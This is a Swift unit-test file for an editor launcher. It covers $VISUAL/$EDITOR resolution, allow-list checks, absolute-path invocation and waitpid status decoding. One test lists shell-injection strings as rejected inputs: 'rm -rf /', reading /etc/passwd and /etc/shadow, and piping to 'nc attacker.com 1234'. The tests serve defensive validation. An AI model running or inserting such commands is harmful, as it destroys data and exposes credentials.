import XCTest
@testable import HirundoCore

/// Covers how an editor is chosen from the environment. Launching a real process is out
/// of scope — the risk here is in what gets accepted as a command, not in spawning it.
final class EditorLauncherTests: XCTestCase {

    func testPrefersVisualOverEditor() {
        let command = EditorLauncher.resolveEditorCommand(
            environment: ["VISUAL": "nano", "EDITOR": "vim"]
        )

        XCTAssertEqual(command, "nano")
    }

    func testFallsBackToEditor() {
        XCTAssertEqual(
            EditorLauncher.resolveEditorCommand(environment: ["EDITOR": "vim"]),
            "vim"
        )
    }

    func testReturnsNilWhenNeitherIsSet() {
        XCTAssertNil(EditorLauncher.resolveEditorCommand(environment: [:]))
    }

    func testReturnsNilForBlankValues() {
        XCTAssertNil(EditorLauncher.resolveEditorCommand(environment: ["EDITOR": ""]))
        XCTAssertNil(EditorLauncher.resolveEditorCommand(environment: ["EDITOR": "   "]))
    }

    func testRejectsAnEditorOutsideTheAllowList() {
        XCTAssertNil(EditorLauncher.resolveEditorCommand(environment: ["EDITOR": "malicious"]))
    }

    func testRejectsShellInjectionAttempts() {
        let attempts = [
            "vim; rm -rf /",
            "nano && cat /etc/passwd",
            "code | nc attacker.com 1234",
            "vim `cat /etc/shadow`",
            "vim $(whoami)"
        ]

        for attempt in attempts {
            XCTAssertNil(
                EditorLauncher.resolveEditorCommand(environment: ["EDITOR": attempt]),
                "Expected \(attempt) to be rejected"
            )
        }
    }

    func testRejectsPathTraversal() {
        XCTAssertNil(
            EditorLauncher.resolveEditorCommand(environment: ["EDITOR": "../../bin/vim"])
        )
    }

    func testFallsBackToEditorWhenVisualIsRejected() {
        // A bad $VISUAL must not shadow a perfectly good $EDITOR.
        let command = EditorLauncher.resolveEditorCommand(
            environment: ["VISUAL": "vim; rm -rf /", "EDITOR": "vim"]
        )

        XCTAssertEqual(command, "vim")
    }

    // MARK: - Telling "nothing set" apart from "set but refused"

    func testResolveEditor_reportsNotConfiguredWhenNothingIsSet() {
        XCTAssertEqual(EditorLauncher.resolveEditor(environment: [:]), .notConfigured)
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["EDITOR": "   "]),
            .notConfigured
        )
    }

    func testResolveEditor_reportsTheRejectedValueForAnEditorWithArguments() {
        // The common case: a perfectly good editor the allow-list refuses because the
        // value carries a flag. Telling this user to "set $EDITOR" would be wrong.
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["EDITOR": "code --wait"]),
            .rejected(variable: "EDITOR", value: "code --wait")
        )
    }

    func testResolveEditor_namesTheVariableThatWasSet() {
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["VISUAL": "subl -w"]),
            .rejected(variable: "VISUAL", value: "subl -w")
        )
    }

    func testResolveEditor_reportsVisualWhenBothAreRejected() {
        // $VISUAL takes precedence, so it is the value that would have been used.
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["VISUAL": "subl -w", "EDITOR": "code --wait"]),
            .rejected(variable: "VISUAL", value: "subl -w")
        )
    }

    func testResolveEditor_reportsEditorWhenOnlyVisualIsBlank() {
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["VISUAL": "", "EDITOR": "nvim -u NONE"]),
            .rejected(variable: "EDITOR", value: "nvim -u NONE")
        )
    }

    func testResolveEditor_resolvesBeforeReportingARejection() {
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["VISUAL": "code --wait", "EDITOR": "vim"]),
            .resolved(EditorLauncher.ResolvedEditor(command: "vim", rawValue: "vim"))
        )
    }

    // MARK: - Running what was validated

    /// Validation returns only the command name, so the value it checked has to be carried
    /// alongside it: an absolute path must be spawned as that path.
    func testResolveEditor_keepsTheValueAnAbsolutePathWasValidatedFrom() {
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["EDITOR": "/usr/bin/vim"]),
            .resolved(EditorLauncher.ResolvedEditor(command: "vim", rawValue: "/usr/bin/vim"))
        )
    }

    func testResolveEditor_trimsSurroundingWhitespaceFromTheValue() {
        XCTAssertEqual(
            EditorLauncher.resolveEditor(environment: ["EDITOR": "  /usr/bin/vim  "]),
            .resolved(EditorLauncher.ResolvedEditor(command: "vim", rawValue: "/usr/bin/vim"))
        )
    }

    /// `resolveEditorCommand` keeps handing back the bare command name whatever shape the
    /// value had, because that is what its callers ask it for.
    func testResolveEditorCommand_stillReturnsTheBareNameForAnAbsolutePath() {
        XCTAssertEqual(
            EditorLauncher.resolveEditorCommand(environment: ["EDITOR": "/usr/bin/vim"]),
            "vim"
        )
    }

    /// `EDITOR=/usr/bin/vim` must run that file, not whatever `vim` a `PATH` search finds:
    /// a writable directory earlier in `PATH` would otherwise win over the validated one.
    func testInvocation_runsTheExactExecutableForAnAbsolutePath() {
        let editor = EditorLauncher.ResolvedEditor(command: "vim", rawValue: "/usr/bin/vim")

        XCTAssertEqual(editor.invocation, .executable("/usr/bin/vim"))
    }

    /// A bare name is a request for a `PATH` lookup, which is not the bug — keep it.
    func testInvocation_looksUpABareCommandNameOnPath() {
        let editor = EditorLauncher.ResolvedEditor(command: "vim", rawValue: "vim")

        XCTAssertEqual(editor.invocation, .pathLookup("vim"))
    }

    /// Validation strips characters before extracting the command name, so a path and the
    /// name approved for it can in principle disagree. Nothing is run when they do.
    func testInvocation_refusesWhenThePathAndTheValidatedNameDisagree() {
        let editor = EditorLauncher.ResolvedEditor(command: "vim", rawValue: "/usr/bin/emacs")

        XCTAssertEqual(editor.invocation, .inconsistent)
    }

    // MARK: - Decoding what `waitpid` reports

    // `WIFSTOPPED`, `WIFEXITED` and `WEXITSTATUS` are C macros, so Swift cannot call them and
    // the wait loop reads the status by hand. Both readings decide something that fails
    // silently when it is wrong: a stopped editor mistaken for a finished one is reported as a
    // failed edit and never resumed, and a finished editor mistaken for a stopped one is
    // waited on forever. The statuses below are built the way the kernel encodes them — the
    // low byte is `0177` for a stop, zero for a normal exit and the terminating signal
    // otherwise, with the exit code in the next byte up.

    private func stopped(by signal: Int32) -> Int32 { (signal << 8) | 0x7F }
    private func exited(with code: Int32) -> Int32 { code << 8 }
    private func killed(by signal: Int32, dumpedCore: Bool = false) -> Int32 {
        return dumpedCore ? signal | 0x80 : signal
    }

    func testIsStopped_recognisesAStop() {
        // What a Ctrl-Z at the terminal produces, and what the editor's own `tcsetattr`
        // produces when it is not the foreground group.
        XCTAssertTrue(EditorLauncher.isStopped(stopped(by: SIGTSTP)))
        XCTAssertTrue(EditorLauncher.isStopped(stopped(by: SIGTTOU)))
        XCTAssertTrue(EditorLauncher.isStopped(stopped(by: SIGSTOP)))
    }

    func testIsStopped_isFalseForEveryWayOfEnding() {
        XCTAssertFalse(EditorLauncher.isStopped(exited(with: 0)))
        XCTAssertFalse(EditorLauncher.isStopped(exited(with: 1)))
        // `0177` in the *high* byte is an exit code of 127, not a stop: the low byte is what
        // says which of the two this is.
        XCTAssertFalse(EditorLauncher.isStopped(exited(with: 127)))
        XCTAssertFalse(EditorLauncher.isStopped(killed(by: SIGKILL)))
        XCTAssertFalse(EditorLauncher.isStopped(killed(by: SIGSEGV, dumpedCore: true)))
    }

    func testExitedCleanly_isTrueOnlyForAZeroExit() {
        XCTAssertTrue(EditorLauncher.exitedCleanly(exited(with: 0)))
    }

    func testExitedCleanly_isFalseForANonZeroExit() {
        XCTAssertFalse(EditorLauncher.exitedCleanly(exited(with: 1)))
        XCTAssertFalse(EditorLauncher.exitedCleanly(exited(with: 127)))
        XCTAssertFalse(EditorLauncher.exitedCleanly(exited(with: 255)))
    }

    /// An editor killed by a signal has not saved anything either, core dump or not.
    func testExitedCleanly_isFalseForASignalledExit() {
        XCTAssertFalse(EditorLauncher.exitedCleanly(killed(by: SIGKILL)))
        XCTAssertFalse(EditorLauncher.exitedCleanly(killed(by: SIGTERM)))
        XCTAssertFalse(EditorLauncher.exitedCleanly(killed(by: SIGSEGV, dumpedCore: true)))
    }

    /// A stop is not an exit, and must never be read as a successful one — that is the pair of
    /// readings the wait loop branches on.
    func testExitedCleanly_isFalseForAStop() {
        XCTAssertFalse(EditorLauncher.exitedCleanly(stopped(by: SIGTSTP)))
        XCTAssertFalse(EditorLauncher.exitedCleanly(stopped(by: SIGTTOU)))
    }
}
